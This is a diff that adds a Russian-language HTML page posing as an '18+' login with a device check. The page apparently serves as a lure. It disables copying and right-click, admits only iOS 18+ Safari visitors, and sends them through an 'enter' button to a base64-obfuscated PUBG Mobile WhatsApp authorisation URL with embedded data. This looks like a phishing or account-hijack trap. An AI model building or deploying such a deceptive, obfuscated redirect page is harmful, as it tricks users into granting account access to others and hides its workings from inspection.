@@ -1,0 +1,190 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>18+ Вход</title>
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+
+  <style>
+    html, body {
+      height: 100%; margin: 0; overflow: hidden;
+      background: radial-gradient(circle at center, #0a0e1a 0%, #04060a 100%);
+      color: #fff; font-family: "Segoe UI", Roboto, system-ui, sans-serif;
+      display: grid; place-items: center; position: relative;
+    }
+
+    /* Полупрозрачный водяной знак */
+    body::before {
+      content: "vskoll";
+      position: absolute;
+      font-size: 15vw;
+      font-weight: 800;
+      color: rgba(0, 153, 255, 0.05);
+      text-transform: uppercase;
+      letter-spacing: 0.2em;
+      filter: blur(2px);
+      user-select: none;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%) rotate(-10deg);
+      pointer-events: none;
+    }
+
+    .card {
+      width: min(92vw, 420px);
+      padding: 28px;
+      border-radius: 20px;
+      background: rgba(10, 15, 25, 0.85);
+      backdrop-filter: blur(8px);
+      box-shadow: 0 0 25px rgba(0, 132, 255, 0.25),
+                  0 0 80px rgba(0, 132, 255, 0.1) inset;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      text-shadow: 0 0 10px #4f8cff, 0 0 20px rgba(79, 140, 255, 0.6);
+      margin-bottom: 12px;
+    }
+
+    p {
+      font-size: 15px;
+      opacity: 0.85;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    .reason {
+      font-size: 13px;
+      margin-top: 8px;
+      opacity: 0.8;
+      text-shadow: 0 0 5px #001133;
+    }
+
+    button {
+      width: 100%;
+      height: 50px;
+      border: none;
+      border-radius: 12px;
+      background: linear-gradient(90deg, #0077ff, #00bfff);
+      color: #fff;
+      font-weight: 700;
+      font-size: 16px;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      box-shadow: 0 0 15px rgba(0, 153, 255, 0.4);
+    }
+    button:hover {
+      transform: scale(1.02);
+      box-shadow: 0 0 25px rgba(0, 153, 255, 0.6);
+    }
+    button:active {
+      transform: scale(0.98);
+      box-shadow: 0 0 10px rgba(0, 153, 255, 0.8);
+    }
+
+    .ok { color: #00eaff; text-shadow: 0 0 8px #00eaff; }
+    .err { color: #ff5555; text-shadow: 0 0 6px #ff4444; }
+    .notice { font-size: 12px; opacity: 0.65; margin-top: 14px; }
+
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <h1 id="title">Проверка устройства</h1>
+    <p id="text">Определение платформы…</p>
+    <div class="reason" id="reason"></div>
+    <button id="enterBtn" style="display:none;">Войти 18+</button>
+    <div class="notice" id="note"></div>
+  </div>
+
+  <script>
+    ['contextmenu','copy','cut','paste','dragstart'].forEach(evt => {
+      window.addEventListener(evt, e => e.preventDefault(), { passive: false });
+    });
+
+    const URL_PARTS = [
+      "aHR0cHM6Ly93d3cucHViZ21vYmlsZS5jb20vaWcvaXRvcC93aGF0c2FwcC9hdXRo",
+      "P3R5cGU9d2hhdHNhcHBhdXRoJmRhdGE9ZXlKYWRYTjBJam9nS2x3SWFTVnlaVzFo",
+      "YVhwbEluMHNJbWgwZEhCek9pOHhNVFV5T1RrM05EZzBOVGt3TUNJc0ltbGhjM05s",
+      "ZEhKbGMzUWlPaUpHVjJsMGFYWmxJaXdpWm1KallYUnBiMjRpT2lJd1dsaEtWbUZK",
+      "UlVGUFZrUkpVQSJ9"
+    ];
+    function decodeUrl(parts) {
+      try {
+        const b64 = parts.join('');
+        const bin = atob(b64);
+        const bytes = Uint8Array.from(bin, c => c.charCodeAt(0));
+        return new TextDecoder().decode(bytes);
+      } catch { return ''; }
+    }
+
+    function go() {
+      const target = decodeUrl(URL_PARTS);
+      if (!target) return;
+      location.assign(target);
+    }
+
+    const title  = document.getElementById('title');
+    const text   = document.getElementById('text');
+    const reason = document.getElementById('reason');
+    const btn    = document.getElementById('enterBtn');
+    const note   = document.getElementById('note');
+    btn.addEventListener('click', go);
+
+    function getIOSVersion() {
+      const m = navigator.userAgent.match(/OS (\d+)_/);
+      return m ? parseInt(m[1],10) : null;
+    }
+
+    function isSafariWebKit() {
+      const ua = navigator.userAgent;
+      return /Safari/.test(ua) &&
+             !/CriOS|FxiOS|EdgiOS|Chrome|Firefox|Edg/.test(ua) &&
+             navigator.vendor === 'Apple Computer, Inc.';
+    }
+
+    function isIOSFamily() {
+      return /iPhone|iPad|iPod/.test(navigator.userAgent) ||
+        (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+    }
+
+    function trustScore() {
+      let score = 0;
+      if (isSafariWebKit()) score += 2;
+      if (isIOSFamily()) score += 2;
+      if (!('userAgentData' in navigator)) score += 0.5;
+      return score;
+    }
+
+    (async () => {
+      const iosVer = getIOSVersion();
+      const score = trustScore();
+      const isIOS = isIOSFamily();
+
+      if (isIOS && iosVer && iosVer >= 18 && score >= 3.5) {
+        title.textContent = "Подтверждение 18+";
+        text.innerHTML = `<span class="ok">Доступ разрешён.</span>`;
+        reason.textContent = `Обнаружено: iOS ${iosVer}, Safari WebKit.`;
+        btn.style.display = "block";
+        note.textContent = "Кнопка активна только для устройств iOS/iPadOS 18+.";
+      } else {
+        title.textContent = "Доступ отклонён";
+        let r = "";
+        if (!isIOS) r = "Устройство не относится к iOS/iPadOS.";
+        else if (!iosVer || iosVer < 18) r = "Версия iOS ниже 18.";
+        else if (score < 3.5) r = "Обнаружена подмена User-Agent или прокси.";
+        else r = "Неизвестная ошибка.";
+        text.innerHTML = `<span class="err">Отказ в доступе.</span>`;
+        reason.textContent = "Причина: " + r;
+        note.textContent = "Доступ возможен только на оригинальных устройствах Apple с Safari 18+.";
+      }
+    })();
+  </script>
+</body>
+</html>
